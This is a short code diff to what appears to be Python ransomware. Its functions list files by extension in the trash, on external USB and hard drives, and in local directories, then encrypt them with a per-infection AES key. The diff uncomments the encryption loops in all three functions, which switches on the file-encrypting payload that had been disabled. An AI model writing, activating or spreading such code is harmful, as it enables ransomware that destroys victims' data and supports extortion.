@@ -103,10 +103,10 @@ def list_trash(senha_AES, tipos_arq):
                     if extensao[1] == ext:
                         encrypt_list.append(arq)
                         break
-'''
+
         for element in encrypt_list: # encrypt happens here
             criptografa(chave_AES , element)
-'''
+
 
 # look's for external media such as usb / hd's
 def listar_media(senha_AES, tipos_arq):
@@ -124,10 +124,10 @@ def listar_media(senha_AES, tipos_arq):
                         break
 
 
-        '''#cripto routine
+        #cripto routine
         for element in encrypt_list: # encrypt happens here
             criptografa(chave_AES , element)
-            '''
+            
 
 # lists and encrypt files
 def listar(chave_AES, diretorio, tipos_arq):
@@ -160,11 +160,9 @@ def listar(chave_AES, diretorio, tipos_arq):
     for e in file_to_encrypt: # append local files inside the complete list of files inside directories
         encrypt_list.append(e)
 
-    #
-'''
+
     for element in encrypt_list: # encrypt happens here
         criptografa(chave_AES , element)
-'''
 
 
 # Generate random AES key for each infection
